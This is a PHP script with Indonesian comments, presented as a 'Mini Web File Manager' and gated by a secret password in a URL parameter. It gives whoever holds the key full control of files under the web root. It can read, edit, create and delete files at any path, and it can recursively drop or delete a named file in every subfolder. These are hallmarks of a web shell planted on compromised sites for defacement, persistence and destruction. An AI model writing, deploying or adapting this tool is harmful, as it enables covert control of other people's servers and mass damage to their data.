<?php
// ===== Proteksi akses =====
$hashParam = '$2y$10$zWaRUKAZSJB.KIWaNL6U8O6hRlibDZr8T7fjDd0BoL9RnfevDeaIm'; // contoh hash
$param = $_GET['access'] ?? '';
if (!password_verify($param, $hashParam)) {
    http_response_code(403);
    echo "<h2>❌ Access Denied</h2>";
    exit;
}

// ===== Default root =====
$defaultRoot = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;

// ===== Ambil parameter =====
$dir        = $_REQUEST['directory'] ?? $defaultRoot;
$filename   = $_REQUEST['filename'] ?? '';
$content    = $_REQUEST['content'] ?? '';
$deleteFile = trim($_REQUEST['deletefile'] ?? '');
$recursive  = isset($_REQUEST['recursive']);
$action     = $_REQUEST['action'] ?? '';

// ===== Fungsi =====
function processCreate($dir, $filename, $content, $recursive) {
    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<p style='color:red'>❌ Tidak bisa tulis di folder: $dir</p>";
        return;
    }

    if (!empty($filename)) {
        $filepath = rtrim($dir, '/\\') . '/' . $filename;
        if (!file_exists($filepath)) {
            if (file_put_contents($filepath, $content)) {
                echo "<p style='color:green'>✅ Dibuat: $filepath</p>";
            } else {
                echo "<p style='color:red'>❌ Gagal buat: $filepath</p>";
            }
        } else {
            echo "<p style='color:orange'>⚠️ Sudah ada: $filepath</p>";
        }
    }

    if ($recursive) {
        $folders = array_filter(glob($dir . '/*'), 'is_dir');
        foreach ($folders as $folder) {
            processCreate($folder, $filename, $content, true);
        }
    }
}

function processDelete($dir, $deleteFile, $recursive) {
    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<p style='color:red'>❌ Tidak bisa akses folder: $dir</p>";
        return;
    }

    if (!empty($deleteFile)) {
        $fileToDelete = rtrim($dir, '/\\') . '/' . $deleteFile;
        if (file_exists($fileToDelete)) {
            if (unlink($fileToDelete)) {
                echo "<p style='color:blue'>🗑️ Dihapus: $fileToDelete</p>";
            } else {
                echo "<p style='color:red'>❌ Gagal hapus: $fileToDelete</p>";
            }
        } else {
            echo "<p style='color:gray'>ℹ️ Tidak ditemukan: $fileToDelete</p>";
        }
    }

    if ($recursive) {
        $folders = array_filter(glob($dir . '/*'), 'is_dir');
        foreach ($folders as $folder) {
            processDelete($folder, $deleteFile, true);
        }
    }
}

function processOpen($dir, $filename) {
    $filepath = rtrim($dir, '/\\') . '/' . $filename;
    if (file_exists($filepath)) {
        echo "<h3>📂 Isi File: $filepath</h3>";
        echo "<form method='POST'>
                <input type='hidden' name='directory' value='".htmlspecialchars($dir)."'>
                <input type='hidden' name='filename' value='".htmlspecialchars($filename)."'>
                <textarea name='content' rows='20' style='width:100%;'>"
                    . htmlspecialchars(file_get_contents($filepath)) .
                "</textarea>
                <br><button class='btn create' name='action' value='save'>💾 Save File</button>
              </form>";
    } else {
        echo "<p style='color:gray'>ℹ️ File tidak ditemukan: $filepath</p>";
    }
}

// ===== Save file =====
function processSave($dir, $filename, $content) {
    $filepath = rtrim($dir, '/\\') . '/' . $filename;
    if (file_exists($filepath) && is_writable($filepath)) {
        if (file_put_contents($filepath, $content)) {
            echo "<p style='color:green'>💾 File disimpan: $filepath</p>";
        } else {
            echo "<p style='color:red'>❌ Gagal simpan file: $filepath</p>";
        }
    } else {
        echo "<p style='color:red'>❌ File tidak bisa diakses: $filepath</p>";
    }
}

// ===== Eksekusi aksi =====
if (!empty($action)) {
    if ($action === 'create') processCreate($dir, $filename, $content, $recursive);
    elseif ($action === 'delete') processDelete($dir, $deleteFile, $recursive);
    elseif ($action === 'open') processOpen($dir, $filename);
    elseif ($action === 'save') processSave($dir, $filename, $content);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini Web File Manager</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        input[type="text"], textarea { width: 100%; padding: 8px; margin: 5px 0; font-family: monospace; }
        label { display: block; margin-top: 10px; }
        .btn { padding: 10px 20px; margin-top: 10px; border: none; cursor: pointer; }
        .create { background: green; color: white; }
        .delete { background: red; color: white; }
        .open { background: blue; color: white; }
    </style>
</head>
<body>
<h2>🛠️ Mini Web File Manager</h2>
<form method="POST">
    <label>📁 Directory:</label>
    <input type="text" name="directory" value="<?php echo htmlspecialchars($defaultRoot); ?>" required>

    <label>📝 Filename:</label>
    <input type="text" name="filename" placeholder="Nama file">

    <label>📄 Content:</label>
    <textarea name="content" rows="10" placeholder="Isi file"></textarea>

    <label>🗑️ Filename to delete:</label>
    <input type="text" name="deletefile" placeholder="Nama file">

    <label><input type="checkbox" name="recursive"> Recursive (All subfolders)</label>
    <br>
    <button class="btn create" name="action" value="create">🚀 Create File</button>
    <button class="btn delete" name="action" value="delete">🗑️ Delete File</button>
    <button class="btn open" name="action" value="open">📂 Open File</button>
</form>
</body>
</html>
